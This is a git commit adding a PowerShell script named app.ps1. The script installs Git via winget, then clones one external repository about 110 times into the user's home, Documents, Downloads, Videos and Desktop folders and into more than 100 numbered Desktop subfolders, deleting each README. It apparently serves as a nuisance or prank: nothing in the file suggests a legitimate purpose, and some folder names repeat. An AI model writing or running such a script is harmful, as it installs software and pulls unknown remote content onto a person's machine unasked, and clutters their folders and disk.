698b3958990527625337b7ea277e3e8f942440f0
Zaherb <111398267+zaherbaveaur@users.noreply.github.com>
2024-12-20 19:23:57 -0500

    Add files via upload

---
+++ desktop/app.ps1
@@ -0,0 +1,657 @@
+winget install --id Git.Git -e --source winget
+cd ~
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Documents
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Downloads
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Videos
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+mkdir hi1
+cd hi1
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi2
+cd hi2
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi3
+cd hi3
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi4
+cd hi4
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi5
+cd hi5
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi6
+cd hi6
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi7
+cd hi7
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi8
+cd hi8
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi9
+cd hi9
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi10
+cd hi10
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi11
+cd hi11
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi12
+cd hi12
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi13
+cd hi13
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi14
+cd hi14
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi15
+cd hi15
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi16
+cd hi16
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi17
+cd hi17
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi18
+cd hi18
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi19
+cd hi19
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi20
+cd hi20
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi21
+cd hi21
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi22
+cd hi22
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi23
+cd hi23
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi24
+cd hi24
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi25
+cd hi25
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi26
+cd hi26
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi27
+cd hi27
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi23
+cd hi23
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi28
+cd hi28
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi29
+cd hi29
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi30
+cd hi30
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi31
+cd hi31
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi32
+cd hi32
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi33
+cd hi33
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi34
+cd hi34
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi35
+cd hi35
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi36
+cd hi36
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi30
+cd hi30
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi37
+cd hi37
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi38
+cd hi38
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi39
+cd hi39
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi40
+cd hi40
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi41
+cd hi41
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi42
+cd hi42
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi43
+cd hi43
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi44
+cd hi44
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi45
+cd hi45
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi46
+cd hi46
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi47
+cd hi47
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi48
+cd hi48
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi49
+cd hi49
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi50
+cd hi50
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi51
+cd hi51
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi52
+cd hi52
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi53
+cd hi53
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi54
+cd hi54
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi55
+cd hi55
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi56
+cd hi56
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi57
+cd hi57
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi58
+cd hi58
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi59
+cd hi59
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi60
+cd hi60
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi61
+cd hi61
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi62
+cd hi62
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi63
+cd hi63
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi64
+cd hi64
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi65
+cd hi65
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi66
+cd hi66
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi67
+cd hi67
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi68
+cd hi68
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi69
+cd hi69
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi70
+cd hi70
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi71
+cd hi71
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi72
+cd hi72
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi73
+cd hi73
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi74
+cd hi74
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi75
+cd hi75
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi76
+cd hi76
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi77
+cd hi77
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi78
+cd hi78
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi79
+cd hi79
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi80
+cd hi80
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi81
+cd hi81
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi82
+cd hi82
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi83
+cd hi83
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi84
+cd hi84
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi85
+cd hi85
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi86
+cd hi86
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi87
+cd hi87
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi88
+cd hi88
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi89
+cd hi89
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi90
+cd hi90
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi91
+cd hi91
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi92
+cd hi92
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi93
+cd hi93
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi94
+cd hi94
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi95
+cd hi95
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi96
+cd hi96
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi97
+cd hi97
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi98
+cd hi98
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi99
+cd hi99
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+cd ~/Desktop
+mkdir hi100
+cd hi100
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+mkdir hi101
+cd hi101
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+mkdir hi102
+cd hi102
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+mkdir hi103
+cd hi103
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+mkdir hi104
+cd hi104
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
+mkdir hi105
+cd hi105
+git clone https://github.com/ZahirMandane/hi
+cd hi
+remove-item README.md
